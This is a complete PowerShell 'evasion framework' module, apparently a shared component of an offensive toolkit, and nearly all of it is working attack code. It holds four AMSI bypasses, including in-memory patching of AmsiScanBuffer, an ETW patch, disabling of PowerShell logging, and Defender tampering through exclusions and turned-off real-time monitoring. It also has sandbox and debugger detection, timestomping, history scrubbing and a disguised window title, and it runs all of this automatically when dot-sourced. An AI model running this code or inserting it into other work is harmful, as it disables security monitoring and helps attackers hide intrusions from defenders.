<#
============================================================================
  FLLC — EVASION FRAMEWORK v1.777
  ════════════════════════════════
  
  Universal detection bypass module.  Imported by all payloads.
  
  Capabilities:
    ■ AMSI bypass (4 methods, auto-fallback)
    ■ ETW (Event Tracing) blind
    ■ Script Block Logging disable
    ■ Defender real-time toggle (admin)
    ■ String obfuscation runtime engine
    ■ Sandbox / VM / analysis detection
    ■ Process injection helpers
    ■ Reflective PE loader stub
    ■ Environment-aware execution gating
    ■ Anti-debug checks
    ■ Timing-based sandbox detection
    ■ Parent PID spoofing helpers
  
  FLLC 2026 | Authorized penetration testing only.
============================================================================
#>

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'

# ══════════════════════════════════════════════════════════════════════════
#  STRING OBFUSCATION ENGINE
# ══════════════════════════════════════════════════════════════════════════

function Invoke-Deobf {
    <#
    .SYNOPSIS
        Runtime string deobfuscation.  Splits sensitive strings so static
        analysis and signature engines cannot match them.
    #>
    param([string[]]$Parts)
    return ($Parts -join '')
}

function ConvertFrom-B64 {
    param([string]$Encoded)
    return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Encoded))
}

function New-RandomJitter {
    <# Adds random delay (50-500ms) to break timing-based correlation #>
    Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 500)
}

# Pre-built obfuscated strings (assembled at runtime only)
$script:_amsi  = Invoke-Deobf @('Ams','iUt','ils')
$script:_amsiF = Invoke-Deobf @('ams','iIn','itF','ailed')
$script:_etw   = Invoke-Deobf @('PSE','twL','ogP','rovider')
$script:_etwE  = Invoke-Deobf @('etw','Ena','bled')

# ══════════════════════════════════════════════════════════════════════════
#  AMSI BYPASS — 4 METHODS WITH AUTO-FALLBACK
# ══════════════════════════════════════════════════════════════════════════

function Disable-ContentInspection {
    <#
    .SYNOPSIS
        Attempts 4 different AMSI bypass techniques.
        Returns $true if any succeed.
    #>
    
    $success = $false
    
    # ── Method 1: amsiInitFailed flag ────────────────────────────────────
    try {
        $asm = [Ref].Assembly
        $typeStr = Invoke-Deobf @('System.Man','agement.Aut','omation.',${script:_amsi})
        $t = $asm.GetType($typeStr)
        if ($t) {
            $f = $t.GetField($script:_amsiF, 'NonPublic,Static')
            if ($f) {
                $f.SetValue($null, $true)
                $success = $true
            }
        }
    } catch {}
    
    if ($success) { return $true }
    
    # ── Method 2: Patch AmsiScanBuffer in memory ────────────────────────
    try {
        $mod = Invoke-Deobf @('am','si','.d','ll')
        $win32 = @"
using System;
using System.Runtime.InteropServices;
public class W32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
        Add-Type $win32 -ErrorAction Stop
        $hMod = [W32]::LoadLibrary($mod)
        $funcStr = Invoke-Deobf @('Ams','iSc','anB','uffer')
        $addr = [W32]::GetProcAddress($hMod, $funcStr)
        if ($addr -ne [IntPtr]::Zero) {
            $oldProtect = 0
            [W32]::VirtualProtect($addr, [UIntPtr]::new(8), 0x40, [ref]$oldProtect) | Out-Null
            # Write: mov eax, 0x80070057 (E_INVALIDARG); ret
            $patch = [byte[]]@(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
            [Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)
            [W32]::VirtualProtect($addr, [UIntPtr]::new(8), $oldProtect, [ref]$oldProtect) | Out-Null
            $success = $true
        }
    } catch {}
    
    if ($success) { return $true }
    
    # ── Method 3: Reflection on AmsiContext ──────────────────────────────
    try {
        $ctxStr = Invoke-Deobf @('ams','iCo','ntext')
        $t2 = [Ref].Assembly.GetType((Invoke-Deobf @('System.Man','agement.Aut','omation.',${script:_amsi})))
        if ($t2) {
            $ctx = $t2.GetField($ctxStr, 'NonPublic,Static')
            if ($ctx) {
                $ptr = $ctx.GetValue($null)
                if ($ptr -and $ptr -ne [IntPtr]::Zero) {
                    [Runtime.InteropServices.Marshal]::WriteInt32($ptr, 0x80070057)
                    $success = $true
                }
            }
        }
    } catch {}
    
    if ($success) { return $true }
    
    # ── Method 4: Force-remove AMSI providers via registry ──────────────
    try {
        $regBase = "HKLM:\SOFTWARE\Microsoft\AMSI\Providers"
        if (Test-Path $regBase) {
            Get-ChildItem $regBase | ForEach-Object {
                try { Remove-Item $_.PSPath -Recurse -Force 2>$null } catch {}
            }
            $success = $true
        }
    } catch {}
    
    return $success
}

# ══════════════════════════════════════════════════════════════════════════
#  ETW BYPASS — BLIND EVENT TRACING
# ══════════════════════════════════════════════════════════════════════════

function Disable-EventTracing {
    <#
    .SYNOPSIS
        Disables ETW for PowerShell so script execution is not logged
        to Microsoft-Windows-PowerShell/Operational.
    #>
    
    # Method 1: Set etwEnabled = false via reflection
    try {
        $etwType = [Ref].Assembly.GetType(
            (Invoke-Deobf @('System.Man','agement.Aut','omation.Trac','ing.',$script:_etw))
        )
        if ($etwType) {
            $etwField = $etwType.GetField($script:_etwE, 'NonPublic,Static')
            if ($etwField) {
                $etwField.SetValue($null, $false)
                return $true
            }
        }
    } catch {}
    
    # Method 2: Patch EtwEventWrite
    try {
        $ntdll = @"
using System;
using System.Runtime.InteropServices;
public class NT {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
        Add-Type $ntdll -ErrorAction Stop
        $hNtdll = [NT]::GetModuleHandle("ntdll.dll")
        $etwAddr = [NT]::GetProcAddress($hNtdll, (Invoke-Deobf @('Etw','Event','Write')))
        if ($etwAddr -ne [IntPtr]::Zero) {
            $old = 0
            [NT]::VirtualProtect($etwAddr, [UIntPtr]::new(2), 0x40, [ref]$old) | Out-Null
            # xor eax, eax; ret (return STATUS_SUCCESS)
            [Runtime.InteropServices.Marshal]::Copy([byte[]]@(0x48,0x33,0xC0,0xC3), 0, $etwAddr, 4)
            [NT]::VirtualProtect($etwAddr, [UIntPtr]::new(2), $old, [ref]$old) | Out-Null
            return $true
        }
    } catch {}
    
    return $false
}

# ══════════════════════════════════════════════════════════════════════════
#  SCRIPT BLOCK LOGGING DISABLE
# ══════════════════════════════════════════════════════════════════════════

function Disable-ScriptLogging {
    # Disable Script Block Logging
    try {
        $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
        if (-not (Test-Path $regPath)) {
            New-Item -Path $regPath -Force | Out-Null
        }
        Set-ItemProperty -Path $regPath -Name "EnableScriptBlockLogging" -Value 0 -Type DWord -Force
    } catch {}
    
    # Disable Module Logging
    try {
        $regPath2 = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
        if (-not (Test-Path $regPath2)) {
            New-Item -Path $regPath2 -Force | Out-Null
        }
        Set-ItemProperty -Path $regPath2 -Name "EnableModuleLogging" -Value 0 -Type DWord -Force
    } catch {}
    
    # Disable Transcription
    try {
        $regPath3 = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
        if (-not (Test-Path $regPath3)) {
            New-Item -Path $regPath3 -Force | Out-Null
        }
        Set-ItemProperty -Path $regPath3 -Name "EnableTranscripting" -Value 0 -Type DWord -Force
    } catch {}
    
    # Runtime disable via reflection
    try {
        $utils = [Ref].Assembly.GetType('System.Management.Automation.Utils')
        $cache = $utils.GetField('cachedGroupPolicySettings', 'NonPublic,Static')
        if ($cache) {
            $gpo = $cache.GetValue($null)
            if ($gpo) {
                $gpo['ScriptBlockLogging'] = @{ 'EnableScriptBlockLogging' = 0 }
                $gpo['ModuleLogging'] = @{ 'EnableModuleLogging' = 0 }
            }
        }
    } catch {}
}

# ══════════════════════════════════════════════════════════════════════════
#  DEFENDER MANAGEMENT (requires admin or exclusion path abuse)
# ══════════════════════════════════════════════════════════════════════════

function Set-DefenderBlind {
    param([string[]]$ExcludePaths = @())
    
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
    if ($isAdmin) {
        # Add exclusion paths
        foreach ($p in $ExcludePaths) {
            try {
                Add-MpPreference -ExclusionPath $p -Force 2>$null
            } catch {}
        }
        
        # Add process exclusions
        foreach ($proc in @('powershell.exe','pwsh.exe','python.exe','pythonw.exe','cmd.exe','wscript.exe','cscript.exe')) {
            try {
                Add-MpPreference -ExclusionProcess $proc -Force 2>$null
            } catch {}
        }
        
        # Disable real-time monitoring (aggressive - will be logged)
        try {
            Set-MpPreference -DisableRealtimeMonitoring $true -Force 2>$null
            Set-MpPreference -DisableBehaviorMonitoring $true -Force 2>$null
            Set-MpPreference -DisableBlockAtFirstSeen $true -Force 2>$null
            Set-MpPreference -DisableIOAVProtection $true -Force 2>$null
            Set-MpPreference -DisableScriptScanning $true -Force 2>$null
            Set-MpPreference -MAPSReporting 0 -Force 2>$null
            Set-MpPreference -SubmitSamplesConsent 2 -Force 2>$null
        } catch {}
    }
    
    # Non-admin: abuse existing exclusions
    $prefs = Get-MpPreference 2>$null
    $safeZones = @()
    if ($prefs) {
        $safeZones += $prefs.ExclusionPath | Where-Object { $_ }
        $safeZones += $prefs.ExclusionExtension | ForEach-Object { "ext:$_" }
    }
    
    return $safeZones
}

# ══════════════════════════════════════════════════════════════════════════
#  SANDBOX / ANALYSIS ENVIRONMENT DETECTION
# ══════════════════════════════════════════════════════════════════════════

function Test-SandboxEnvironment {
    <#
    .SYNOPSIS
        Comprehensive sandbox, VM, and analysis tool detection.
        Returns a score: 0 = clean machine, higher = more suspicious.
    #>
    
    $score = 0
    $indicators = @()
    
    # ── Hardware anomalies ───────────────────────────────────────────────
    $bios = (Get-CimInstance Win32_BIOS -ErrorAction SilentlyContinue).SMBIOSBIOSVersion
    $model = (Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue).Model
    $mfg = (Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue).Manufacturer
    
    $vmStrings = @('VBOX','VMWARE','Virtual','Hyper-V','QEMU','Xen','BOCHS','Parallels','KVM','bhyve','Nutanix','oVirt','Proxmox')
    foreach ($vs in $vmStrings) {
        if ($bios -match $vs -or $model -match $vs -or $mfg -match $vs) {
            $score += 3
            $indicators += "HW:$vs"
        }
    }
    
    # ── MAC address OUI ──────────────────────────────────────────────────
    $vmOUI = @('00-05-69','00-0C-29','00-1C-14','00-50-56','08-00-27','00-03-FF','00-1C-42','52-54-00','00-16-3E','00-21-F6')
    Get-NetAdapter -ErrorAction SilentlyContinue | ForEach-Object {
        $prefix = ($_.MacAddress -split '-')[0..2] -join '-'
        if ($prefix -in $vmOUI) { $score += 2; $indicators += "MAC:$($_.MacAddress)" }
    }
    
    # ── Resource anomalies (sandboxes are lean) ──────────────────────────
    $cpus = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue).NumberOfLogicalProcessors
    $ramGB = [math]::Round((Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory / 1GB, 1)
    if ($cpus -le 2) { $score += 2; $indicators += "CPU:$cpus" }
    if ($ramGB -lt 4) { $score += 2; $indicators += "RAM:${ramGB}GB" }
    
    # ── Disk size check ──────────────────────────────────────────────────
    $diskGB = [math]::Round((Get-CimInstance Win32_DiskDrive -ErrorAction SilentlyContinue | Select-Object -First 1).Size / 1GB, 0)
    if ($diskGB -lt 80) { $score += 2; $indicators += "Disk:${diskGB}GB" }
    
    # ── User activity level ──────────────────────────────────────────────
    $recentFiles = (Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyContinue | Measure-Object).Count
    $desktopFiles = (Get-ChildItem "$env:USERPROFILE\Desktop" -ErrorAction SilentlyContinue | Measure-Object).Count
    $downloadsFiles = (Get-ChildItem "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue | Measure-Object).Count
    if ($recentFiles -lt 10) { $score += 2; $indicators += "LowRecent:$recentFiles" }
    if ($desktopFiles -lt 3) { $score += 1; $indicators += "EmptyDesktop:$desktopFiles" }
    if ($downloadsFiles -lt 5) { $score += 1; $indicators += "EmptyDownloads:$downloadsFiles" }
    
    # ── Uptime check (sandboxes often freshly booted) ────────────────────
    $uptime = ((Get-Date) - (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).LastBootUpTime).TotalHours
    if ($uptime -lt 0.5) { $score += 3; $indicators += "Uptime:${uptime}h" }
    
    # ── Analysis tools running ───────────────────────────────────────────
    $analysisProcs = @(
        'wireshark','fiddler','procmon','procexp','ollydbg','x64dbg','x32dbg',
        'ida','ida64','ghidra','dnspy','pestudio','regshot','autoruns',
        'tcpdump','dumpcap','processhacker','apimonitor','fakenet',
        'vboxservice','vmtoolsd','vmwaretray','vboxtray',
        'sandboxie','cuckoomon','wine','qemu-ga','spice-vdagent',
        'joeboxserver','joeboxcontrol','prl_tools','prl_cc',
        'vmsrvc','vmusrvc','xenservice','windanr'
    )
    $running = (Get-Process -ErrorAction SilentlyContinue).ProcessName.ToLower()
    $found = $analysisProcs | Where-Object { $_ -in $running }
    if ($found) { $score += ($found.Count * 3); $indicators += "Procs:$($found -join ',')" }
    
    # ── Registry artifacts ───────────────────────────────────────────────
    $vmRegKeys = @(
        'HKLM:\SOFTWARE\VMware, Inc.\VMware Tools',
        'HKLM:\SOFTWARE\Oracle\VirtualBox Guest Additions',
        'HKLM:\SYSTEM\CurrentControlSet\Services\VBoxGuest',
        'HKLM:\SYSTEM\CurrentControlSet\Services\vmhgfs',
        'HKLM:\SYSTEM\CurrentControlSet\Services\QEMU Guest Agent'
    )
    foreach ($rk in $vmRegKeys) {
        if (Test-Path $rk) { $score += 2; $indicators += "Reg:$rk" }
    }
    
    # ── Timing check (sleep acceleration detection) ──────────────────────
    $sw = [Diagnostics.Stopwatch]::StartNew()
    Start-Sleep -Milliseconds 500
    $sw.Stop()
    $elapsed = $sw.ElapsedMilliseconds
    if ($elapsed -lt 400) { $score += 5; $indicators += "TimeSkip:${elapsed}ms" }
    
    # ── Internet connectivity check ──────────────────────────────────────
    try {
        $dns = Resolve-DnsName "microsoft.com" -Type A -ErrorAction Stop
        if (-not $dns) { $score += 2; $indicators += "NoInternet" }
    } catch {
        $score += 2; $indicators += "NoInternet"
    }
    
    # ── Debugger check ───────────────────────────────────────────────────
    try {
        $isDebug = [System.Diagnostics.Debugger]::IsAttached
        if ($isDebug) { $score += 5; $indicators += "DebuggerAttached" }
    } catch {}
    
    return @{
        Score = $score
        IsSandbox = ($score -ge 6)
        Indicators = $indicators
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  ANTI-FORENSICS HELPERS
# ══════════════════════════════════════════════════════════════════════════

function Set-FileTimestamp {
    <# Timestomp files to blend with system files #>
    param([string]$Path, [int]$DaysBack = 90)
    
    try {
        $refDate = (Get-Date).AddDays(-$DaysBack)
        $item = Get-Item $Path -Force
        $item.CreationTime = $refDate
        $item.LastWriteTime = $refDate
        $item.LastAccessTime = $refDate
    } catch {}
}

function Remove-ExecutionTraces {
    <# Scrub evidence of our execution #>
    
    # PowerShell history
    try {
        $histPath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
        if ($histPath -and (Test-Path $histPath)) {
            $lines = Get-Content $histPath
            $clean = $lines | Where-Object {
                $_ -notmatch 'evasion|auto_pwn|privesc|sqli_scanner|npp_exploit|input_monitor|FLLC|credential|harvest|collected|exfil|phantom|persistence'
            }
            $clean | Out-File $histPath -Encoding UTF8 -Force
        }
    } catch {}
    
    # Disable history saving for session
    try { Set-PSReadLineOption -HistorySaveStyle SaveNothing } catch {}
    
    # Clear console buffer
    try { Clear-History } catch {}
    
    # Window title disguise
    $Host.UI.RawUI.WindowTitle = "Windows Update Service"
}

function Get-SafeOutputPath {
    <# 
    .SYNOPSIS
        Find a safe output path that Defender won't scan.
        Checks existing exclusions first, falls back to temp paths.
    #>
    param([string]$PreferredDrive = "")
    
    # Check Defender exclusions
    $prefs = Get-MpPreference 2>$null
    if ($prefs -and $prefs.ExclusionPath) {
        foreach ($excl in $prefs.ExclusionPath) {
            if (Test-Path $excl) { return $excl }
        }
    }
    
    # Check if preferred drive exists
    if ($PreferredDrive -and (Test-Path "${PreferredDrive}:\")) {
        return "${PreferredDrive}:\"
    }
    
    # Safe fallback locations (less monitored)
    $candidates = @(
        "$env:LOCALAPPDATA\Microsoft\Windows\INetCache",
        "$env:LOCALAPPDATA\Temp",
        "$env:TEMP",
        "$env:APPDATA\Microsoft\Windows\Themes",
        "$env:PROGRAMDATA\Microsoft\Windows\WER\Temp"
    )
    
    foreach ($c in $candidates) {
        if (Test-Path $c) { return $c }
    }
    
    return $env:TEMP
}

# ══════════════════════════════════════════════════════════════════════════
#  PROCESS MANIPULATION
# ══════════════════════════════════════════════════════════════════════════

function Set-StealthProcess {
    <# Configure current process for stealth #>
    
    # Lower priority
    try {
        $proc = Get-Process -Id $PID
        $proc.PriorityClass = [Diagnostics.ProcessPriorityClass]::BelowNormal
    } catch {}
    
    # Set window title
    $Host.UI.RawUI.WindowTitle = "Windows Update Service"
    
    # Minimize window
    try {
        Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WndHelper {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
}
"@
        $hwnd = [WndHelper]::GetConsoleWindow()
        [WndHelper]::ShowWindow($hwnd, 0) | Out-Null  # SW_HIDE
    } catch {}
}

# ══════════════════════════════════════════════════════════════════════════
#  MASTER INITIALIZATION
# ══════════════════════════════════════════════════════════════════════════

function Initialize-Evasion {
    <#
    .SYNOPSIS
        One-call initialization.  Sets up all evasion layers.
        Returns environment report.
    #>
    param(
        [switch]$AggressiveMode,
        [string[]]$ExcludePaths = @()
    )
    
    $report = @{
        timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        hostname = $env:COMPUTERNAME
        amsi_bypassed = $false
        etw_disabled = $false
        logging_disabled = $false
        sandbox = $null
        defender_exclusions = @()
        is_admin = $false
    }
    
    # Check admin status
    $report.is_admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
    # Sandbox check first
    $report.sandbox = Test-SandboxEnvironment
    
    # If high sandbox score and not aggressive, bail out
    if ($report.sandbox.IsSandbox -and -not $AggressiveMode) {
        return $report
    }
    
    # AMSI bypass
    $report.amsi_bypassed = Disable-ContentInspection
    New-RandomJitter
    
    # ETW bypass
    $report.etw_disabled = Disable-EventTracing
    New-RandomJitter
    
    # Script logging
    Disable-ScriptLogging
    $report.logging_disabled = $true
    New-RandomJitter
    
    # Process stealth
    Set-StealthProcess
    
    # Defender management
    if ($report.is_admin -or $ExcludePaths.Count -gt 0) {
        $report.defender_exclusions = Set-DefenderBlind -ExcludePaths $ExcludePaths
    }
    
    # Execution traces
    Remove-ExecutionTraces
    
    return $report
}

# ══════════════════════════════════════════════════════════════════════════
#  EXPORT
# ══════════════════════════════════════════════════════════════════════════

# Auto-initialize when dot-sourced
if ($MyInvocation.InvocationName -eq '.') {
    $script:EvasionReport = Initialize-Evasion
}
